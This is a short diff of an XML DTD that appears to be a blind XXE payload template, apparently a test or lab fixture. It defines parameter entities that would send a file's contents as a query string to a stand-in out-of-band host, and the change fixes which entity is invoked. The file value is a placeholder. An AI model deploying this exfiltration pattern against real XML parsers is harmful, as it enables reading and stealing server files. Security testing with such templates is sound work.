@@ -16,4 +16,4 @@
      (the &#x25; is the encoded % so the inner entity is built at runtime) -->
 <!ENTITY % file "benign-local-placeholder">
 <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://xxe2.YOUR-OOB-HOST.example.invalid/?d=%file;'>">
-%send;
+%eval;
